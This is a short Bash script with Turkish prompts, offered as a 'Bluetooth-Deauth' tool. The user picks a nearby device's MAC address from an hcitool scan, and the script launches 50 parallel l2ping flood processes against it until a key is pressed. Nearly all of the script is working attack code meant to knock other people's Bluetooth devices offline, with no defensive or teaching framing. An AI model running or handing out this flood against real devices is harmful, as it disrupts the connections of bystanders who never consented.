#!/bin/bash

# Kontrol edilecek komutlar
required_commands=("figlet" "lolcat" "l2ping" "hcitool")

# Gerekli komutların kontrolü
for cmd in "${required_commands[@]}"; do
    command -v "$cmd" >/dev/null 2>&1 || { echo >&2 "Betiğin çalışması için '$cmd' komutu gereklidir. Lütfen kurun."; exit 1; }
done



#echo "BT_DEAUTHkomutunu çalıştırmak için aşağıdaki bilgileri girin:" | lolcat -f
echo "Deaut Başladıktan sonra !!!DURDURMAK İÇİN "g" TUŞUNA BASIN!!!" | lolcat -f
echo "Bluetooth-Deauth programını çalıştırmak için aşağıdaki bilgileri girin:" | lolcat -f
#read -p "Cihaz adını girin: " device_name
#read -p "MAC adresini girin: " mac_address

read -p "Cihaz adını girin (hcitool -a ile bakabilirsiniz): " device_name
read -p "MAC adresini girin (hcitool scan ile etrafınızdaki bt cihazlarının mac adresini görebilirsiniz): " mac_address

echo "Deauth 50 defa çalışacak. Çıkmak için 'g' tuşuna basın." | lolcat -f

count=0
while [ $count -lt 50 ]; do
    #l2ping -i "$device_name" -f "$mac_address" > /dev/null 2>&1 &
     l2ping -i "$device_name" -f "$mac_address" > $PWD/hata.log 2>&1 &
    count=$((count+1))
done

read -n 1 -s -r -p "Deauth başladı. Durdurmak için 'g' tuşuna basın."

if [[ $REPLY =~ ^[gG]$ ]]; then
    sudo killall l2ping -9 
    #sudo pkill -9 l2ping > /dev/null 2>&1
    echo "Deauth sonlandı ve betik durduruldu. Eğer çalışmazsa hata.log dosyasına bakın."
fi
#echo "Fedora or Not tarafından yapıldı" | lolcat -f
echo
figlet -c "Fedora or Not tarafindan yapildi" | lolcat -f
